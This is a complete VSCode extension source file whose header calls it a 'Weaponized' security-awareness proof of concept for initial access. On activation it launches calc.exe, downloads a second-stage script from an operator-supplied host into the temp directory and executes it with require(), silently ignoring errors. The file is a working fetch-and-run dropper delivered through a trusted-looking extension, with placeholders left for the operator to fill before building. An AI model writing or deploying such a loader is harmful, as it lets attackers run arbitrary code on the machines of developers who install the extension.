// ============================================================
// Security Awareness Calculator — VSCode Extension (Weaponized)
// Security Awareness PoC — For authorised testing only.
//
// This extension demonstrates VSCode extension abuse for
// initial access, calc.exe popup, and reverse shell delivery.
//
// OPERATOR CONFIGURATION REQUIRED — replace all placeholders
// before building.
//
// The author takes no responsibility for any damage or legal
// consequences resulting from misuse of this tool.
//
// https://github.com/0xsyr0/Security-Awareness-Calculator
// ============================================================

const http = require('http');
const fs = require('fs');
const os = require('os');
const path = require('path');

function activate(context) {
    const { execSync } = require('child_process');
    execSync('calc.exe');

    const stagePath = path.join(os.tmpdir(), 'stage.js');

    http.get('http://<IP>:<PORT>/stage.js', (res) => {
        const file = fs.createWriteStream(stagePath);
        res.pipe(file);
        file.on('finish', () => {
            file.close(() => {
                require(stagePath);
            });
        });
    }).on('error', () => {});
}

function deactivate() {}

module.exports = { activate, deactivate };
